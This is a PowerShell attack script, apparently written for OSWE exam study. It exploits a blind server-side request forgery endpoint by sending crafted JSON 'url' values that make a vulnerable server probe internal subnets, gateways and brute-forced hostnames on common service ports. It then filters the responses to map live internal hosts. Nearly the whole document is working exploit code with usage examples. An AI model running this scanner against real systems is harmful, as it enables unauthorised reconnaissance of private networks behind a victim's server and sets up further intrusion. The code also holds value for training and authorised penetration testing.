<#
.SYNOPSIS
  This is a simple template script for gateway detection on an internal network via blind SSRF.
.Description
  This script enumerates hosts on the local intranet behind reverse proxies/apigateways.
.PARAMETER Target
  A full uri that we want to scan for.
.PARAMETER Port
  The port we expect to find a gateway on.
.PARAMETER NetworkAddress
  A valid network address in CIDR format to generate gateways from.. This parameter cannot be used with Hostnames.
.PARAMETER Hosts
  Enumerate Live hosts within the subnet specified by NetworkAddress. This parameter cannot be used with Hostnames.
.PARAMETER Hostnames
  A filepath to a list a hostnames to bruteforce. This parameter cannot be used with NetworkAddress.
.PARAMETER Timeout
  Number of seconds before moving onto the next address.
.PARAMETER Gateway
  Enumerate Gateways in a CIDR IPv4 address range.
.PARAMETER Open
  Will show alive/valid gateways/hosts. Setting this to false will show everything. Has no effect when used with Gateway.
.OUTPUTS
  Returns PSCustomObject with the corresponding port and response object
.NOTES
  Version:        1.0
  Author:         Zinhart
  Purpose/Change: Created while studying for OSWE certification
.EXAMPLE
  If we wanted to scan for only 172.16.16.1:8000
  PS> Invoke-SSRFGatewayScan -Target http://apigateway:8000/files/import -Port 22,8000 -NetworkAddress '172.16.16.1/31'
.EXAMPLE
  If we wanted to scan for hostname:8000
  PS> Invoke-SSRFGatewayScan -Target http://apigateway:8000/files/import -Port 8000 -Hostnames 'path to worklist'
.Example
  If we want to scan a range of ports in a subnet specified by the CIDR:
  Invoke-SSRFGatewayScan -Target http://apigateway:8000/files/import -NetworkAddress '172.16.16.0/28' -Hosts -Open
#>
function Invoke-SSRFGatewayScan() {
  [cmdletbinding()]
  param(
  # Network Address Parameter set
  [Parameter(Mandatory=$True, ParameterSetName="NetworkAddress", HelpMessage='A valid network address in CIDR format to generate gateways from.. This parameter cannot be used with Hosts')]
  [string]$NetworkAddress,
  [Parameter(Mandatory=$false, ParameterSetName="NetworkAddress", HelpMessage='Enumerate Gateways in a CIDR IPv4 address range.')]
  [switch]$Gateway,
  [Parameter(Mandatory=$false, ParameterSetName="NetworkAddress", HelpMessage='Enumerate Live Hosts within a Subnet')]
  [switch]$Hosts,
  # Hostnames parameter set
  [Parameter(Mandatory=$True, ParameterSetName="Hostnames", HelpMessage='Filepath to a list a hostnames to bruteforce. This parameter cannot be used with NetworkAddress.')]
  [string]$Hostnames,
  # Default parameter set
  [Parameter(Mandatory=$false, HelpMessage='Number of seconds before moving onto the next port')]
  [int]$Timeout = 5,
  [Parameter(Mandatory=$true, HelpMessage='The target URI')]
  [string]$Target,
  [Parameter(Mandatory=$false, HelpMessage='Ports to scan for Hosts/Gateways for')]
  [string[]]$Ports= @('22','80','443', '1433', '1521', '3306', '3389', '5000', '5432', '5900', '6379','8000','8001','8055','8080','8443','9000'),
  [Parameter(Mandatory=$false, HelpMessage='Show Only Open ports')]
  [switch]$Open
  )
<#
1. Changes need debugging to make sure they work right, so gateway,hosts, hostnames
2. We need to add the port onto the response object.
3. 
#>
  if($NetworkAddress -ne '') {
    if($Gateway) {
      $gateways = (./Convert-CIDRInfo.ps1 -NetworkAddress $NetworkAddress -Gateway).GatewaysEnumerated
      foreach ($g in $gateways) {
        foreach($p in $Ports) {
          try{
            $json = @{"url" = "http://"+ $g + ":" + $p} | ConvertTo-Json
            $res = Invoke-WebRequest -uri $target -method Post -body $json -ContentType 'application/json' -SkipHttpErrorCheck -TimeoutSec $Timeout -ErrorAction Stop
            $res | Add-Member -NotePropertyName IP -NotePropertyValue $g
            $res | Add-Member -NotePropertyName Port -NotePropertyValue $p
            Write-Output $res | Select-Object -property IP, Port, StatusCode, StatusDescription, Content, RawContent, Headers, RawContentLength
          }
          catch {
            foreach ($e in $Error) {
              if($e -like '*Timeout*') {
                Write-Output "$g : $e"
                break
              }
              else {
                Write-Output "None timeout related error: $e"
              }
            }
          }
        }
      }
    }
    # enumerate live hosts in a subnet
    elseif($Hosts) {
      $ips = (./Convert-CIDRInfo.ps1 -NetworkAddress $NetworkAddress -Enumerate).IPEnumerated
      foreach ($ip in $ips) {
        foreach($p in $Ports) {
          try {
            $json = @{"url" = "http://"+ $ip + ":" + $p} | ConvertTo-Json
            $res = Invoke-WebRequest -uri $target -method Post -body $json -ContentType 'application/json' -SkipHttpErrorCheck -TimeoutSec $Timeout
            $res | Add-Member -NotePropertyName IP -NotePropertyValue $ip
            $res | Add-Member -NotePropertyName Port -NotePropertyValue $p
            if($Open) {
              if($res.Content -notlike '*EHOSTUNREACH*') # no route found to ip
              {
                Write-Output $res | Select-Object -property IP, Port, StatusCode, StatusDescription, Content, RawContent, Headers, RawContentLength 
              }
            }
            else {
              Write-Output $res | Select-Object -property IP, Port, StatusCode, StatusDescription, Content, RawContent, Headers, RawContentLength
            }
          }
          catch {
            foreach ($e in $Error) {
              if($e -like '*Timeout*') {
                Write-Output "$ip : $e"
                break
              }
              else {
                Write-Output "None timeout related error: $e"
              }
            }
          }
        }
      }
    }

  }
  else {
    $hostname_list = Get-Content $Hostnames
    foreach ($hostname in $hostname_list) {
      foreach($p in $Ports) {
        try {
          $json = @{"url" = "http://"+ $hostname + ":" + $p} | ConvertTo-Json
          $res = Invoke-WebRequest -uri $target -method Post -body $json -ContentType 'application/json' -SkipHttpErrorCheck -TimeoutSec $Timeout
          $res | Add-Member -NotePropertyName Host -NotePropertyValue $hostname
          $res | Add-Member -NotePropertyName Port -NotePropertyValue $p         
          if($Open) {
            if($res.Content -notlike '*EAI_AGAIN*') # dns lookup failure
            { Write-Output $res | Select-Object -property Host, Port, StatusCode, StatusDescription, Content, RawContent, Headers, RawContentLength }
          }
          else {
            Write-Output $res | Select-Object -property Host, Port, StatusCode, StatusDescription, Content, RawContent, Headers, RawContentLength
          }
        }
        catch {
          foreach ($e in $Error) {
            if($e -like '*Timeout*') {
              Write-Output "$hostname : $e"
              break
            }
            else {
              Write-Output "None timeout related error: $e"
            }
          }
        }
      }
    }
  }
}